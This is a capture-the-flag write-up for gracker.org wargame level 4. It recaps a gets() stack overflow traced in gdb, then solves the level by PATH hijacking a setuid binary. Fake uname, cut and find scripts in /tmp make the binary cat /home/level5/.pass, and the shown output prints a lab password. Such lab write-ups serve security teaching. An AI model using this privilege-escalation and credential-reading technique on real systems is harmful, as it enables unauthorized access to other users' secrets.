Exercise
========

Login to ```gracker.org``` with the password of user ```level4``` which we gained in ```level3```:
```
user@system ~ $ ssh level4@gracker.org
      __                  _
     / /                 | |
    / /_ _ _ __ __ _  ___| | _____ _ __
   / / _` | '__/ _` |/ __| |/ / _ \ '__|
  / / (_| | | | (_| | (__|   <  __/ |
 /_/ \__, |_|  \__,_|\___|_|\_\___|_|
      __/ |
     |___/
             ~ follow the white rabbit ~
                     ~ gracker ~
            ~ irc.hackint.org  #gracker ~
level4@gracker.org's password:
X11 forwarding request failed on channel 0
Congratulation! You made it to level4!
Have a look at the recap and the next story step.
 ~ Red or Blue Pill?
```
As stated by the text which is displayed after login, we start by displaying the recap of the previous level:
```
level4@gracker:~$ cat recap
The inspiration for this level comes from the first level of exploit-exercises.com/protostar [0]

The issue is, that there is only a buffer that is 64byte wide, but gets() can read a lot of more characters and
tries to store them in the buffer:

    char buffer[64];
    gets(buffer);

If you look at the manpage of gets, you will read the following (`man gets`):

  BUGS
       Never  use  gets().  Because it is impossible to tell without knowing the data in advance how many characters gets() will read,
       and because gets() will continue to store characters past the end of the buffer, it is extremely dangerous to use.  It has been
       used to break computer security.
                                                               ┌──────────────────────────────────────┐
                                                               │ #include <stdlib.h>                  │
                                                               │ #include <unistd.h>                  │
                                                               │ #include <stdio.h>                   │
   So this is what happens here too. Let's have a look at      │                                      │
   the disassembly and compare it with the sourcecode.         │ void spawn_shell() {                 │
   Here you can see the assembly code matched up with the      │     gid_t gid;                       │
   C code. Especially interesting is the `admin_enabled`       │     uid_t uid;                       │
   variable. You can see it's actually stored on the           │     gid = getegid();                 │
   stack (rbp-0x4). And above that is the buffer. So when      │     uid = geteuid();                 │
   the gets() call reads the input, it will happily write      │     setresgid(gid, gid, gid);        │
   over everything on the stack.                               │     setresuid(uid, uid, uid);        │
                                                               │     system("/bin/sh");               │
                                                               │ }                                    │
 ┌─────────────────────────────────────────────────────────────┤                                      │
 │ 0x0000000000400718 <+0>:     push   rbp                     │ int main(int argc, char **argv)      │
 │ 0x0000000000400719 <+1>:     mov    rbp,rsp                 │ {                                    │
 │ 0x000000000040071c <+4>:     sub    rsp,0x60                │   volatile int admin_enabled;        │
 │ 0x0000000000400720 <+8>:     mov    DWORD PTR [rbp-0x54],edi│   char buffer[64];                   │
 │ 0x0000000000400723 <+11>:    mov    QWORD PTR [rbp-0x60],rsi│                                      │
 │ 0x0000000000400727 <+15>:    mov    DWORD PTR [rbp-0x4],0x0 │   admin_enabled = 0;                 │
 │ 0x000000000040072e <+22>:    mov    edi,0x400800            │                                      │
 │ 0x0000000000400733 <+27>:    call   0x400540 <puts@plt>     │   printf("Zero Cool - Bugdoor ..."); │
 │ 0x0000000000400738 <+32>:    lea    rax,[rbp-0x50]          │                                      │
 │ 0x000000000040073c <+36>:    mov    rdi,rax                 │                                      │
 │ 0x000000000040073f <+39>:    call   0x4005b0 <gets@plt>     │   gets(buffer);                      │
 │ 0x0000000000400744 <+44>:    mov    eax,DWORD PTR [rbp-0x4] │                                      │
 │ 0x0000000000400747 <+47>:    test   eax,eax                 │   if(admin_enabled != 0) {           │
 │ 0x0000000000400749 <+49>:    je     0x400761 <main+73>      │                                      │
 │ 0x000000000040074b <+51>:    mov    edi,0x400828            │                                      │
 │ 0x0000000000400750 <+56>:    call   0x400540 <puts@plt>     │       printf("How can this ...");    │
 │ 0x0000000000400755 <+61>:    mov    eax,0x0                 │                                      │
 │ 0x000000000040075a <+66>:    call   0x4006c6 <spawn_shell>  │       spawn_shell();                 │
 │ 0x000000000040075f <+71>:    jmp    0x40076b <main+83>      │   } else {                           │
 │ 0x0000000000400761 <+73>:    mov    edi,0x400891            │                                      │
 │ 0x0000000000400766 <+78>:    call   0x400540 <puts@plt>     │       printf("Trololol ...");        │
 │ 0x000000000040076b <+83>:    leave                          │   }                                  │
 └─────────────────────────────────────────────────────────────┴──────────────────────────────────────┘

Now let's debug this with gdb:

level3@gracker:/matrix/level3$ gdb level3
GNU gdb (Debian 7.7.1+dfsg-5) 7.7.1
(gdb) set disassembly-flavor intel
(gdb) disassemble main
Dump of assembler code for function main:
   0x0000000000400718 <+0>:     push   rbp
   0x0000000000400719 <+1>:     mov    rbp,rsp
   0x000000000040071c <+4>:     sub    rsp,0x60
   0x0000000000400720 <+8>:     mov    DWORD PTR [rbp-0x54],edi
   0x0000000000400723 <+11>:    mov    QWORD PTR [rbp-0x60],rsi
   0x0000000000400727 <+15>:    mov    DWORD PTR [rbp-0x4],0x0    ; this seems to be the location of the admin_enabled variable. Because it's set to 0.
   0x000000000040072e <+22>:    mov    edi,0x400800
   0x0000000000400733 <+27>:    call   0x400540 <puts@plt>
   0x0000000000400738 <+32>:    lea    rax,[rbp-0x50]
   0x000000000040073c <+36>:    mov    rdi,rax
   0x000000000040073f <+39>:    call   0x4005b0 <gets@plt>
   0x0000000000400744 <+44>:    mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000400747 <+47>:    test   eax,eax                    ; set breakpoint here. after the gets(), and the admin_enabled variable is loaded into eax
   0x0000000000400749 <+49>:    je     0x400761 <main+73>
   0x000000000040074b <+51>:    mov    edi,0x400828
   0x0000000000400750 <+56>:    call   0x400540 <puts@plt>
   0x0000000000400755 <+61>:    mov    eax,0x0
   0x000000000040075a <+66>:    call   0x4006c6 <spawn_shell>
   0x000000000040075f <+71>:    jmp    0x40076b <main+83>
   0x0000000000400761 <+73>:    mov    edi,0x400891
   0x0000000000400766 <+78>:    call   0x400540 <puts@plt>
   0x000000000040076b <+83>:    leave
   0x000000000040076c <+84>:    ret
End of assembler dump.
(gdb) break *0x0000000000400747
Breakpoint 1 at 0x400747
(gdb) r
Starting program: /matrix/level3/level3
Zero Cool - Bugdoor v4
Enter Password:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA                             ; let's put in a bunch of A.

Breakpoint 1, 0x0000000000400747 in main ()
(gdb) x/32x $rsp                                                   ; then we look at the stack after the input was placed in the buffer
0x7fff97737820: 0x97737968  0x00007fff  0x412b44c0  0x00000001     ; all those 0x41 are our "A". The ascii character A has the value 65
0x7fff97737830: 0x41414141  0x41414141  0x41414141  0x41414141     ; or 0x41 in hex. You can see all ascii values with `man ascii`
0x7fff97737840: 0x41414141  0x41414141  0x41414141  0x41414141
0x7fff97737850: 0x41414141  0x00004141  0x00000000  0x00000000
0x7fff97737860: 0x00400770  0x00000000  0x004005d0  0x00000000
0x7fff97737870: 0x97737960  0x00007fff  0x00000000  0x00000000
0x7fff97737880: 0x00000000  0x00000000  0x40d0db45  0x00007fce
0x7fff97737890: 0x00000000  0x00000000  0x97737968  0x00007fff
(gdb) x $rbp-0x4                                                   ; read the admin_enabled variable
0x7fff9773787c: 0x00000000
(gdb) info register eax                                            ; just to make sure. This is admin_enabled loaded into eax for the test branch
eax            0x0  0                                              ; but it's still 0.
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /matrix/level3/level3
Zero Cool - Bugdoor v4                                             ; now let's restart and put in a bunch more
Enter Password:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 1, 0x0000000000400747 in main ()
(gdb) x/32x $rsp                                                   ; stack looks very full with As
0x7ffe1e40c2b0: 0x1e40c3f8  0x00007ffe  0xfbecb4c0  0x00000001
0x7ffe1e40c2c0: 0x41414141  0x41414141  0x41414141  0x41414141
0x7ffe1e40c2d0: 0x41414141  0x41414141  0x41414141  0x41414141
0x7ffe1e40c2e0: 0x41414141  0x41414141  0x41414141  0x41414141
0x7ffe1e40c2f0: 0x41414141  0x41414141  0x41414141  0x41414141
0x7ffe1e40c300: 0x41414141  0x41414141  0x41414141  0x41414141
0x7ffe1e40c310: 0x41414141  0x41414141  0x41414141  0x41414141
0x7ffe1e40c320: 0x41414141  0x41414141  0x41414141  0x41414141
(gdb) x $rbp-0x4                                                   ; and it looks like that admin_enabled got overwritten with AAAA as well.
0x7ffe1e40c30c: 0x41414141
(gdb) info register eax                                            ; yup. eax is not 0 anymore.
eax            0x41414141   1094795585
(gdb)


##########################################################################################

Also python is a great tool to convert numbers, ascii characters, etc.
Python is really great. Get used to it.

level3@gracker:~$ python
Python 2.7.9 (default, Mar  1 2015, 12:57:24)
[GCC 4.9.2] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> ord('A')
65
>>> hex(ord('A'))
'0x41'
>>> hex(65)
'0x41'
>>> chr(65)
'A'
>>> chr(0x65)
'e'
>>> "AAAAAAAAAAAA".encode("hex")
'414141414141414141414141'
>>> "414141414141414141414141".decode("hex")
'AAAAAAAAAAAA'
>>>


[0] https://exploit-exercises.com/protostar/stack0/
```
After this, we can display this level's story file in order to find out what we have to do in order to get the password of level4:
```
level4@gracker:~$ cat story
┌──────────────────────────────────────────────────────────┐
│ Know your environment and don't get lost on your path... │
└──────────────────────────────────────────────────────────┘
Mmhh... It looks like  Zero Cool left his Linux Information Gathering tool
including  sourcecode  in   `/matrix/level4/`.   It provides  some  useful
information about  the system. It probably helped him a lot when he hacked
this system.

But it seems like he is not as skilled as he thinks he is. Look closely at
his tool. Can you abuse it's implementation to get a shell?

For this level you should have a look at how the system finds  the program
that you want to execute. For example when you type `id` or `ls`.  What is
the actual location of these binaries?
```

Solution
========

First of all let's see what the tool does which Zero Cool has left:
```
level4@gracker:~$ /matrix/level4/level4
Zero Cool - Linux Information Gathering Tool v1.2

[*] Get system information:
Linux gracker 3.16.0-4-amd64 #1 SMP Debian 3.16.39-1+deb8u2 (2017-03-07) x86_64 GNU/Linux

[*] Find users available on this system:
level0:1000:1000
level1:1001:1001
level2:1002:1002
level3:1003:1003
#!/bin/bash
/bin/cat /home/level5/.pass
level4:1004:1004
level5:1005:1005
level6:1006:1006
level7:1007:1007
level8:1008:1008
level9:1009:1009
level10:1010:1010
level11:1011:1011
level12:1012:1012
level13:1013:1013

[*] Search for setuid binaries:
-r-sr-x--- 1 level7 level6 6240 Jun 25  2015 /matrix/level6/level6
-r-sr-x--- 1 level5 level4 7704 Jun 20  2015 /matrix/level4/level4
-r-sr-x--- 1 level3 level2 8648 Jun 19  2015 /matrix/level2/level2
-r-sr-x--- 1 level12 level11 4996 Jun 22  2015 /matrix/level11/level11
-r-sr-x--- 1 level1 level0 8448 Jun 19  2015 /matrix/level0/level0
-r-sr-x--- 1 level10 level9 6148 Jun 26  2015 /matrix/level9/level9
-r-sr-x--- 1 level2 level1 8608 Jun 19  2015 /matrix/level1/level1
-r-sr-x--- 1 level4 level3 7856 Jun 20  2015 /matrix/level3/level3
-r-sr-x--- 1 level13 level12 5980 Jul  9  2015 /matrix/level12/level12
-r-sr-x--- 1 level11 level10 8104 Jul  1  2015 /matrix/level10/level10
-r-sr-x--- 1 level8 level7 5380 Jun 26  2015 /matrix/level7/level7
```
Obviously Zero Cool's hacker tool calls several Linux commands in order to collect system data.
This challenge is relatively easy to solve if you read and understand the story text. The tool which Zero Cool left doesn't use full paths when it calls the required tools. More precisely it seems to call at least the commands ```uname```, ```cut``` as well as ```find```.
Let's prove this by setting the ```PATH``` environment variable to ```/tmp``` for example:
```
level4@gracker:~$ PATH=/tmp /matrix/level4/level4
Zero Cool - Linux Information Gathering Tool v1.2

[*] Get system information:
sh: 1: uname: not found

[*] Find users available on this system:
sh: 1: cut: not found

[*] Search for setuid binaries:
```
After we've overwritten the PATH variable, the hacker tool doesn't work properly any longer because it can't find the required Linux command binaries ```uname```, ```cut``` and ```find```. So all we have to do is to create our own version of these tools within ```/tmp``` which simply display the password file of user ```level5```:
```
level4@gracker:~$ echo '#!/bin/bash' > /tmp/find
level4@gracker:~$ echo '/bin/cat /home/level5/.pass' >> /tmp/find
level4@gracker:~$ cat /tmp/find
#!/bin/bash
/bin/cat /home/level5/.pass
level4@gracker:~$ chmod 0777 /tmp/find
level4@gracker:~$ /tmp/find
/bin/cat: /home/level5/.pass: Permission denied
```
```
level4@gracker:~$ ln -s /tmp/find /tmp/uname
level4@gracker:~$ ln -s /tmp/find /tmp/cut
```
And finally we have to call the hacker tool once again with the ```PATH``` variable pointing to ```/tmp``` in order to get the next level's password:
```
level4@gracker:~$ PATH=/tmp /matrix/level4/level4
Zero Cool - Linux Information Gathering Tool v1.2

[*] Get system information:
sh: 1: uname: Permission denied

[*] Find users available on this system:
sh: 1: cut: Permission denied

[*] Search for setuid binaries:
svNa9463?k4m
```
